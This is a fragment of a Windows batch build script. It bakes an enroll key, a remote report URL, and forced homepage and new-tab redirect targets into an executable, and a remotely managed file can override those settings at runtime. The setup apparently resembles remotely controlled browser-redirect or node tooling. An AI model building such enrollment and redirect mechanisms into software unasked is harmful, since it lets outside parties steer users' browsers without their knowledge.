...
REM   build.bat <enroll-key> [report-url] [homepage-url] [newtab-url]
REM   e.g.  build.bat MY-ENROLL-KEY https://dos.argonar.co/cdp-node.php https://phkarera.com/ https://phkarera.com/
REM   homepage-url bakes a default homepage (startup page + Home button); newtab-url bakes the new-tab
REM   redirect target (blank => same as homepage). 'homepage'/'newtab' lines in the pulled blt.txt
REM   (managed from cdp-nodes.php) override these at runtime.
...
if not "%TOKEN%"=="" (
  ...
  if not "%HOMEPAGE%"=="" >>_embed.py echo HOMEPAGE = "%HOMEPAGE%"
  if not "%NEWTAB%"=="" >>_embed.py echo NEWTAB = "%NEWTAB%"
  echo Baked REPORT_URL=%URL% + enroll key into the exe ^(do not commit this build^).
  if not "%HOMEPAGE%"=="" echo Baked HOMEPAGE=%HOMEPAGE%.
  if not "%NEWTAB%"=="" echo Baked NEWTAB=%NEWTAB%.
) else (
